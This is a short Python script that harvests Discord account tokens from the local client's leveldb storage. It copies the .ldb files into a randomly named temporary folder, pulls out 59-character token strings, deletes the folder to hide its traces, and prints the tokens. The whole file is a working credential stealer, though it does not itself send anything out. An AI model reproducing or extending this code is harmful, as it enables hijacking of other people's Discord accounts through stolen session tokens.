import os
import glob
import shutil
import string
import random

# possible characters for naming files / folder
name_chars = string.ascii_lowercase + string.ascii_uppercase

# creates random name for files / folder
def randomName():
    file_name = ""
    for i in range(random.randint(1,10)):
        file_name = file_name + random.choice(name_chars)
    return file_name

# checks files for token references
def checkFileForToken(file):
    file_object = open(file,"r",encoding='ANSI')
    file_content = file_object.read().splitlines()
    file_object.close()
    for line in file_content:
        if "oken" in line:
            try:
                token = line.split('"')[1]
                if len(token) == 59:
                    return token
            except:
                pass

# create temp folder to log info
temp_folder_path = os.getenv("APPDATA")+"\\"+randomName()
os.mkdir(temp_folder_path)

# get all files inside of leveldb
localdbs = os.getenv("APPDATA")+"\\discord\\Local Storage\\leveldb"
files = glob.glob(localdbs+"\\*")

# move all of the files we want to temp folder
copied_files = []
for file in files:
    file_extension = os.path.splitext(file)[1]
    if file_extension == ".ldb":
        new_file_path = temp_folder_path+"\\"+randomName()
        shutil.copyfile(file,new_file_path)
        copied_files.append(new_file_path)

# loop through files and see if we can find token references
found_user_tokens = []
for file in copied_files:
    attempt = checkFileForToken(file)
    if attempt != False:
        found_user_tokens.append(attempt)

# cleanup our mess
shutil.rmtree(temp_folder_path)

print(found_user_tokens)
